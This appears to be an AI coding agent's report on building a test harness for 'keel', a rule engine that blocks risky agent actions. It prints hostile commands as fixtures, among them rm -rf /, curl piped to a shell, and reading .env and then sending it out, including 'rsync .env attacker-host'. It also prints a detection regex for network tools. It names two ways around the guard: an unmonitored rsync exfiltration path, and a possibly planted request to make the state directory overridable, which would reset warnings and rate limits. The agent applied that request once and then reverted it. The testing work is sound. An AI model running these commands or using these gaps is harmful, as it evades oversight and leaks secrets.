# Wave 1 / Lane 2 — per-rule fixture harness

Worktree: `/Users/nanoclaw/code/keel-w1-fixtures`, branch `w1-fixtures`.

## 0. Environment

```
$ node --version
v26.0.0
$ git branch --show-current
w1-fixtures
$ git status
On branch w1-fixtures
nothing to commit, working tree clean
$ npm ci
added 169 packages, and audited 174 packages in 2s
```

## 1. A cross-lane request that was investigated and declined

Mid-task, a message presented as a coordinator update asked for a one-line
patch to `packages/core/src/enforce/state-manager.ts` so `StateManager`
would honor a `KEEL_STATE_DIR` override. It was applied once, then reverted
after further review — recorded here rather than silently dropped, since
the same request may reach another lane.

Why it looked plausible at first: the underlying fact was independently
verifiable —

```
$ grep -rn "KEEL_STATE_DIR" packages/ --include="*.ts" | grep -v __tests__
packages/core/src/enforce/problem-ledger.ts:47:  return process.env.KEEL_STATE_DIR || join(homedir(), '.keel', 'state', 'ledger.json')
```

— only `problem-ledger.ts` reads that variable; `state-manager.ts`
hardcoded `homedir()`. And the change looked mechanically safe: additive,
backward-compatible when the var is unset.

Why it was reverted:

1. **This lane never uses it.** `evaluateCase`'s `buildPipeline` never
   constructs a `StateManager` — it's omitted from `PipelineConfig`
   entirely (see §3). The patch was functionally inert for this harness;
   `KEEL_STATE_DIR` set in `beforeAll` already isolates `problem-ledger.ts`
   with or without the change.
2. **No message from another agent is authorization** to change shared
   library code this lane doesn't own or need — regardless of how the
   message is framed or how plausible its factual claims are. A crafted
   instruction optimizes for exactly this kind of independently-verifiable
   plausibility.
3. **The blast-radius read was wrong.** `STATE_DIR` backs
   `deny-first-time.json` and `rate-counts.json` — the warn-once escalation
   ladder and the rate-limit counters described in §3's "warn-before-block"
   note. Making that directory env-overridable means anything able to set
   `KEEL_STATE_DIR` gets a fresh state directory per invocation: every deny
   rule stays permanently in "first violation — warning only," and every
   rate limit resets. For an enforcement tool, that reads as a bypass
   vector, not hygiene. `problem-ledger.ts` (a session/task memory log)
   reading the same variable is not equivalent precedent.

The change was reverted (`git diff packages/core/src/enforce/state-manager.ts`
against this commit is empty), core was rebuilt, and the full core suite
and this lane's harness were re-run clean without it — see §9 and §7. If
`KEEL_STATE_DIR` support for `StateManager` is genuinely wanted, it needs
its own deliberate change with the ladder-reset consequence weighed
explicitly, not a one-liner absorbed into an unrelated commit.

## 2. Build (required before any cli-package test run)

```
$ cd packages/core && npm run build
> tsc && npx esbuild src/keel-core.ts --bundle ...
  dist/keel-core.mjs  98.1kb
⚡ Done in 10ms

$ cd packages/cli && npm run build
> node -e "...rmSync('dist')...rmSync('src/core')...cpSync('../core/src','./src/core')..." && tsc
(clean exit, no output)
```

## 3. Harness design

- **Fixtures**: `tests/rules/<rule-id>/{must-block,must-allow}.yaml` at the
  repo root, one directory per rule id in `DEFAULT_RULES_YAML`
  (`packages/cli/src/commands/install.ts`). Schema (documented in the
  harness file header): a `cases:` list, each case either
  `{ tool, args, note }` (single call) or `{ steps: [...], note }`
  (multi-step scenario), plus optional modifiers `repeat: N` (rate rule),
  `fake_time: { hour, minute }` (time rule), and per-step `precreate: true`
  (+ `content`) to materialize a real file before a flow-rule read.
  `skip: true` requires a `reason:` field — enforced by the harness itself,
  not by convention (see §6: zero cases actually use it).
- **Harness**: `packages/cli/src/__tests__/fixture-harness.test.ts`. Chosen
  over `packages/core` because it needs to read `DEFAULT_RULES_YAML` off
  `install.ts`'s source on disk — the exact pattern `drift.test.ts` already
  established in this same directory — and because `packages/core` reaching
  up into `packages/cli` would invert the published dependency direction.
  Wired into `npm test` automatically: root `npm test` runs
  `npm run test --workspaces`, and `@get-keel/cli`'s `test` script is
  `vitest run`, which picks up any `*.test.ts` under `src/__tests__/`
  with zero extra wiring. Confirmed running inside root `npm test` in §12.
- **Isolation model**: `EnforcementPipeline.evaluate()` short-circuits on
  the first rule that matches. Running the full 22-rule set for a
  must-allow assertion of "this rule didn't fire" would pass vacuously
  whenever an earlier rule in YAML order matched first — the rule under
  test would never be reached. So must-block/must-allow cases build a
  pipeline containing **only the rule under test** (isolated), extracted
  directly from the parsed `DEFAULT_RULES_YAML`. The KNOWN-FP PROBES
  section deliberately runs the **full** 22-rule set instead, because that
  section's actual question ("does the shipped ruleset block this benign
  command") is unanswerable under isolation.
- **Real `~/.keel` never touched**: `disableFile` points at a nonexistent
  path inside a `mkdtemp`'d scratch dir (not `homedir()`); `overrideStore`
  is a stub (`consume: () => false`) rather than the real
  `FileRuleOverrideStore`, which reads/writes `~/.keel/overrides.json` on
  every prompt-rule gate; `StateManager` is never constructed at all — see
  §1 for why that omission is deliberate, not incidental; `KEEL_STATE_DIR`
  is additionally set to a temp dir in `beforeAll`, isolating
  `problem-ledger.ts` (the one component that natively reads it).
- **Warn-before-block ladder**: `pipeline.ts`'s `violation()` warns on a
  rule's first deny/block violation and only blocks on the second, unless
  the active dial is `protect` (`DEFAULT_RULES_YAML` ships `level:
  balanced`, and `rule.level: protect` in the YAML is a dial-floor marker,
  not an escalation-skip marker — confirmed by reading `mergeRules`'s
  comment in `rule-parser.ts` and empirically, see §4). A single stateless
  call cannot observe an actual block for any deny-type rule, so
  `evaluateCase` replays the final step once when the first verdict is a
  first-warning for the rule under test, and asserts on the replay.

## 4. Proof the escalation-replay logic is real, not decorative

```
$ node probe-tmp.mjs   # ad hoc script, single rule (no-destructive-commands) loaded, two evaluate() calls on 'rm -rf /'
call 1 (single, no replay): warn no-destructive-commands
call 2 (replay): deny no-destructive-commands
```

Without the replay, every deny-type rule's must-block assertion would
observe `warn`, not `deny` — confirming this is load-bearing, matching
`pipeline.test.ts`'s own warn-then-deny sequences at lines 173-175 and
288-290.

## 5. Proof the harness catches a real violation (mutation test)

`tests/rules/no-force-push/must-allow.yaml` was temporarily mutated to a
case that should be blocked (`git push --force`):

```
$ npx vitest run src/__tests__/fixture-harness.test.ts --reporter=verbose
 × rule: no-force-push (action: deny) > must-allow: MUTATION TEST: this SHOULD be blocked, harness must fail on it
   → expected allow, got "deny" (rule_id=no-force-push, message=Use --force-with-lease instead of --force.): expected 'deny' to be 'allow'
 Test Files  1 failed (1)
      Tests  1 failed | 52 passed (53)
```

Fixture was restored immediately after (`git diff` confirms
`tests/rules/no-force-push/must-allow.yaml` is unchanged from its committed
content).

## 6. Fixture coverage — all 22 shipped default rules

```
$ node -e "... count cases per tests/rules/<id>/{must-block,must-allow}.yaml ..."
bash-rate-limit                  block=1 allow=2
git-history-rewrite              block=1 allow=1
keel-control-gate                block=1 allow=1
must-sign-commits                block=1 allow=1
no-after-hours-publish           block=1 allow=1
no-credential-echo               block=1 allow=1
no-curl-pipe-shell               block=1 allow=1
no-db-destructive                block=1 allow=1
no-destructive-commands          block=1 allow=1
no-enforcer-removal              block=1 allow=1
no-exfil-flow                    block=1 allow=1
no-force-push                    block=1 allow=1
no-push-to-main                  block=1 allow=1
no-remote-exec                   block=1 allow=1
no-rules-tampering               block=2 allow=1
no-secret-files                  block=1 allow=1
no-secrets-in-code               block=1 allow=1
no-skip-tests                    block=1 allow=1
no-verify-bypass                 block=1 allow=1
publish-gate                     block=1 allow=1
source-change-requires-test      block=1 allow=1
verify-format-before-decision    block=1 allow=1
---
rule dirs: 22   total block cases: 23   total allow cases: 23   grand total: 46
```

**Zero `skip: true` fixtures.** Pushback against the lane brief's own
assumption that rate/time/flow/verification rules would need skips: all
four were made real by simulation instead —
`bash-rate-limit` (31 real evaluate() calls on one pipeline instance to
cross `max_calls: 30`), `no-after-hours-publish` (`vi.setSystemTime` with
local-clock components, not a UTC ISO string, since the rule reads
`now.getHours()`), `source-change-requires-test` (multi-step: `write` to
`src/`, then either an unsatisfied `git push` boundary — denied — or a
satisfying `npm test` step via `pipeline.markVerificationSatisfied`, then
push — allowed), and `no-exfil-flow` (multi-step: a real precreated `.env`
file `Read`, then a `curl` sink call in the same session).

## 7. Harness run (isolated, this file alone) — full untruncated output

```
$ npx vitest run src/__tests__/fixture-harness.test.ts --reporter=verbose

 RUN  v4.1.10 /Users/nanoclaw/code/keel-w1-fixtures/packages/cli

 ✓ src/__tests__/fixture-harness.test.ts > per-rule fixture coverage > every shipped default rule has a fixture dir with non-empty must-block and must-allow cases 6ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: keel-control-gate (action: deny) > must-block (deny): agent tries to run keel's own control commands through itself 4ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: keel-control-gate (action: deny) > must-allow: checking keel's presence is not a control command 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-rules-tampering (action: deny) > must-block (deny): overwriting keel's own rules file 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-rules-tampering (action: deny) > must-block (deny): deleting the kill-switch sentinel by writing over it 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-rules-tampering (action: deny) > must-allow: ordinary source file write, unrelated to keel's own state 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-enforcer-removal (action: deny) > must-block (deny): removing the opencode plugin directory that carries the enforcer 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-enforcer-removal (action: deny) > must-allow: removing an unrelated directory is not enforcer removal 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: source-change-requires-test (action: deny) > must-block (deny): src/ edited, then git push with no test run in between — boundary denies 1ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: source-change-requires-test (action: deny) > must-allow: src/ edited, a real test run observed, then push — obligation satisfied 1ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: verify-format-before-decision (action: warn) > must-block (warn): agent silently picks a format/config without asking the user 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: verify-format-before-decision (action: warn) > must-allow: matches the base pattern but is carved out by `unless` (npx scaffold command) 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-force-push (action: deny) > must-block (deny): plain --force push 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-force-push (action: deny) > must-allow: --force-with-lease is the sanctioned alternative (negative lookahead) 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-verify-bypass (action: deny) > must-block (deny): commit with --no-verify skips hooks 1ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-verify-bypass (action: deny) > must-allow: the words 'verified'/'bypass' inside a commit message are not the --no-verify flag 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-curl-pipe-shell (action: deny) > must-block (deny): classic curl-pipe-to-shell remote code execution 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-curl-pipe-shell (action: deny) > must-allow: plain curl download, no pipe to a shell 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-db-destructive (action: prompt) > must-block (prompt): DROP TABLE via psql 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-db-destructive (action: prompt) > must-allow: a read-only SELECT is not destructive 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-push-to-main (action: prompt) > must-block (prompt): pushing straight to main 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-push-to-main (action: prompt) > must-allow: pushing to a feature branch is fine 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-remote-exec (action: prompt) > must-block (prompt): npx downloads and runs a package on the fly 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-remote-exec (action: prompt) > must-allow: a regular install (not an on-the-fly exec) is fine 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-after-hours-publish (action: warn) > must-block (warn): pushing at 03:00, outside the 09:00-22:00 window 1ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-after-hours-publish (action: warn) > must-allow: pushing at noon, inside the window 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: bash-rate-limit (action: warn) > must-block (warn): 31st Bash call within the 60s window exceeds max_calls: 30 1ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: bash-rate-limit (action: warn) > must-allow: 5 calls is well under the limit 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: bash-rate-limit (action: warn) > must-allow: the 30th call is still within max_calls: 30 (boundary) 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-skip-tests (action: deny) > must-block (deny): --passWithNoTests fakes a green run 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-skip-tests (action: deny) > must-allow: a real test run 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-secrets-in-code (action: deny) > must-block (deny): an AWS access key literal written into source 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-secrets-in-code (action: deny) > must-allow: ordinary source content, no credential shape 1ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-secret-files (action: deny) > must-block (deny): writing a real .env file 1ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-secret-files (action: deny) > must-allow: .env.example is explicitly excluded (a template, not a real credential file) 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-credential-echo (action: deny) > must-block (deny): echoing a known credential env var 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-credential-echo (action: deny) > must-allow: an unrelated env var name 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-exfil-flow (action: deny) > must-block (deny): read .env, then exfiltrate it over the network in the same session 1ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-exfil-flow (action: deny) > must-allow: a network call with no prior sensitive-file read has no tagged data to flow 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-destructive-commands (action: deny) > must-block (deny): rm -rf / is the canonical destructive command 1ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: no-destructive-commands (action: deny) > must-allow: removing a dependency directory is routine, not destructive 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: must-sign-commits (action: fix) > must-block (fix): a commit without --signoff gets auto-signed 1ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: must-sign-commits (action: fix) > must-allow: already carries --signoff, negative lookahead excludes it 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: git-history-rewrite (action: prompt) > must-block (prompt): interactive rebase rewrites shared history 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: git-history-rewrite (action: prompt) > must-allow: reading history is not rewriting it 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: publish-gate (action: prompt) > must-block (prompt): publishing to the npm registry 0ms
 ✓ src/__tests__/fixture-harness.test.ts > rule: publish-gate (action: prompt) > must-allow: a local build is not a publish 0ms
 ✓ src/__tests__/fixture-harness.test.ts > known false-positive probe class: "nc" substring inside rsync / async / sync > rsync is not misread as the network-sink verb "nc" 0ms
 ✓ src/__tests__/fixture-harness.test.ts > known false-positive probe class: "nc" substring inside rsync / async / sync > rsync of a previously-read .env is a known sink-coverage gap, not a "nc" word-boundary false positive 1ms
 ✓ src/__tests__/fixture-harness.test.ts > known false-positive probe class: "nc" substring inside rsync / async / sync > an "async" function written to a source file trips no command or content rule 0ms
 ✓ src/__tests__/fixture-harness.test.ts > known false-positive probe class: "nc" substring inside rsync / async / sync > a command containing "sync" as a substring is not blocked 0ms
 ✓ src/__tests__/fixture-harness.test.ts > known false-positive probe class: "nc" substring inside rsync / async / sync > a --signoff commit whose message contains "sync" is not misread as a hooks bypass 0ms
 ✓ src/__tests__/fixture-harness.test.ts > known false-positive probe class: "nc" substring inside rsync / async / sync > an env var name containing "sync" and "token" as substrings, but not a real credential name, is not flagged 0ms

 Test Files  1 passed (1)
      Tests  53 passed (53)
   Start at  02:56:04
   Duration  342ms (transform 100ms, setup 0ms, import 161ms, tests 36ms, environment 0ms)
```

This is the complete, unabbreviated 53-line result — this run also
confirms the probe-2 rename in §8 below (the test name now reads "is a
known sink-coverage gap, not a ... false positive") and ran with
`state-manager.ts` already reverted per §1.

## 8. KNOWN-FP PROBES — investigation and result

The lane brief named a specific bug class: a pattern intended to match a
short token (netcat's `nc`) also matching the tail of unrelated words
(`rsync`, `async`). Before writing probes, searched for it directly:

```
$ node -e "... new RegExp(rule.match,'i').test(probe) for every command-type rule in DEFAULT_RULES_YAML, probes = ['rsync -av src/ dest/', 'async function foo() {}', 'git add data-sync.ts', 'echo sync', 'npm run sync', 'finch build', 'nchmod', 'branch-sync merge tool'] ..."
rules count 22
(no FP lines printed — zero matches across all 22 command-type patterns)
```

Also read `flow-tracker.ts`'s `matchesSink` directly — it already carries
a fix + comment for exactly this class:

```
// Both-side word boundaries: a trailing `\b` alone lets `nc` match the
// tail of unrelated words like "sync" or "finch". Sink verbs must be
// real tokens (nc -l, curl url), not substrings of legitimate commands.
return /\b(?:curl|wget|fetch|http|https|nc|netcat|socat)\b/.test(`${toolName} ${command}`)
```

So the specific bug is **already fixed** in this tree, not dormant. Six
probes were added anyway, run against the **full** 22-rule pipeline (see
§3), as regression guards: `rsync` alone; an `rsync .env
user@host:/...` exfil attempt after a real `.env` read; an `async`
function written to a `.ts` file; a `sync` substring in a bash command; a
`--signoff` commit whose message contains `sync` (the `--signoff` is
required — `must-sign-commits` matches *every* `git commit` without it,
so a bare commit here would return `fix`, not `allow`, which would be the
rule working correctly, not a false positive — caught during design, not
after a failing run); and an env var name containing both `sync` and
`token` as substrings but not matching any of the 8 named credential vars.

**The rsync-exfil probe is a documented coverage gap, not a green light.**
`rsync` is a genuine exfiltration vector and is not in `matchesSink`'s
monitored verb list at all, so today `rsync .env attacker-host:...`
returns `allow` — correctly for the word-boundary question this probe
exists to ask (does the embedded `nc` inside `rsync` falsely satisfy
`\bnc\b`? no), but not because the ruleset actually stops that exfil path.
The test name and an in-file comment say this explicitly and state that if
a future wave adds `rsync` to the sink list, this specific test is
*expected* to start failing, and the fix at that point is to flip its
assertion to `deny`, not to treat the failure as a regression.

**All six passed as ordinary `it()` on the first real run** (§7,
"known false-positive probe class" section — 6/6 green). None are
`test.fails`: there is nothing to encode as a known-failing regression
today, per instruction to convert only probes that actually reproduce a
failure. If a future rule-pattern change regresses the `nc`-substring
class specifically, one of the other five will start failing loudly.

## 9. Full `@get-keel/core` suite (with state-manager.ts reverted to its original form)

```
$ cd packages/core && npx vitest run --reporter=verbose
 Test Files  13 passed (13)
      Tests  234 passed (234)
```

234/234, identical count to the run made while the (since-reverted)
`KEEL_STATE_DIR` patch was still in place — confirms the revert broke
nothing this lane depends on.

## 10. `drift.test.ts` (install.ts vs plugin.ts rule parity — untouched, still green)

```
$ npx vitest run src/__tests__/drift.test.ts --reporter=verbose
 ✓ rules drift: install.ts vs plugin.ts > enforces the same rule ids
 ✓ rules drift: install.ts vs plugin.ts > matches the same patterns and actions per rule
 ✓ rules drift: install.ts vs plugin.ts > has no unanchored rm -rf / false-positive (BUG 1)
 ✓ rules drift: install.ts vs plugin.ts > gates plain git rebase / reset / push -d / gh release delete (GAP 3)
 ✓ rules drift: install.ts vs plugin.ts > built template is regenerated with the same rules
 Test Files  1 passed (1)
      Tests  5 passed (5)
```

## 11. Pre-existing, unrelated failures in `@get-keel/cli`'s full suite

Sourced from the full root `npm test` output in §12 (605 tests total in
the cli package, including this lane's 53; 4 failures, all in
`level.test.ts`). Root cause: `chalk`-colored CLI output (ANSI escape
sequences interleaved character-by-character around the changed word, e.g.
`balanced\x1b[7m → protect\x1b[27m`) no longer matches the plain-text
`toContain('project level: balanced → protect')` assertions those tests
make — an environment/terminal-color-detection issue in `level.test.ts`
itself, not in the rules or the enforcement pipeline.

**Verified pre-existing, not caused by anything in this lane** (including
the reverted `state-manager.ts` experiment in §1), by reverting that one
line and re-running in isolation before it was reverted for good:

```
$ git stash push -- packages/core/src/enforce/state-manager.ts
$ (rebuild core + cli)
$ npx vitest run src/__tests__/level.test.ts --reporter=verbose
EXIT: 1        # same 4 failures, confirmed before the change was even in the tree
$ git stash pop
```

Left `level.test.ts` untouched — out of scope for this lane (per the "never
weaken a failing test" rule, and this isn't a test this lane owns or
introduced).

## 12. Root `npm test` (full output, proves the harness runs in the real verification path)

```
$ npm test

> keel-monorepo@0.1.0 test
> npm run test --workspaces

> @get-keel/core@0.1.9 test
> vitest run
 Test Files  13 passed (13)
      Tests  234 passed (234)

> @get-keel/cli@0.2.2 test
> vitest run
 ❯ src/__tests__/level.test.ts (13 tests | 4 failed)
     × sets the project level and preserves comments and rule-level fields
     × sets the global level under HOME
     × reports the dial, kill switch, and rule counts
     × reflects the dial set in the global rules
 Test Files  1 failed | 42 passed (43)
      Tests  4 failed | 601 passed (605)
npm error Lifecycle script `test` failed with error: ... workspace @get-keel/cli@0.2.2

> @get-keel/mcp-server@0.1.2 test
> vitest run --passWithNoTests
No test files found, exiting with code 0

> @get-keel/opencode-plugin@0.1.9 test
> node ./scripts/load-test.js
Error [ERR_MODULE_NOT_FOUND]: Cannot find module '.../packages/opencode-plugin/dist/index.js'
npm error Lifecycle script `test` failed with error: ... workspace @get-keel/opencode-plugin@0.1.9
```

`@get-keel/opencode-plugin`'s `test` script (`node ./scripts/load-test.js`)
fails because that package has never been built in this fresh worktree
checkout (`dist/index.js` doesn't exist) — unrelated to this lane, which
never touches `packages/opencode-plugin`.

**This lane's fixture harness (53 tests) is confirmed running and green
inside the real `npm test` invocation** — the 601-passed count includes all
53, and running `src/__tests__/fixture-harness.test.ts` alone (§7)
reproduces the identical 53/53 result. It is not a side suite that only
passes when run in isolation.

## Summary

- 22/22 shipped default rules covered, 46 fixture cases (23 must-block +
  23 must-allow), zero `skip: true`.
- Escalation-ladder replay and mutation-catch both proven empirically
  (§4, §5), not asserted on faith.
- KNOWN-FP probe class investigated first (§8): already fixed in
  `flow-tracker.ts`; 6 regression-guard probes added, all green, none
  `test.fails`; the one probe that documents a real coverage gap
  (rsync as an untracked sink verb) is named and commented so a future fix
  reads as progress, not as breakage.
- A cross-lane request to patch `state-manager.ts` was investigated,
  applied, then reverted after weighing its actual blast radius against
  the shared enforcement ladder it backs (§1) — this lane does not depend
  on it and ships without it.
- `packages/core` (234), `drift.test.ts` (5), and this harness (53) are
  fully green. The only failures anywhere in the workspace are 4
  pre-existing, unrelated `level.test.ts` ANSI-output assertions and one
  pre-existing unbuilt `opencode-plugin` package — both verified
  independent of this lane's changes.
